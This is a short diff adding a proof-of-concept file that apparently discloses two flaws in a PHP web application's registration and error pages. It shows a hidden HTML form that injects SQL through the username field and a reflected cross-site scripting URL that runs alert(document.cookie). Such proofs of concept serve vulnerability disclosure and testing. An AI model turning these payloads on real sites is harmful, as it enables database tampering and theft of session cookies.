@@ -1,0 +1,18 @@
+SQL-injection:
+
+&lt;form action=&quot;http://www.example.com/index.php?pageid=ext&amp;ext=login&amp;extpage=registrate&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;nuser&quot; value=&quot;123&#039;SQL_CODE&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;npass&quot; value=&quot;password&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;renpass&quot; value=&quot;password&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;gvrg&quot; value=&quot;1&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;antw&quot; value=&quot;2&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;test@email.com&quot;/&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Registrate&quot; name=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+
+Cross-site scripting:
+
+http://www.example.com/index.php?error=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+
+
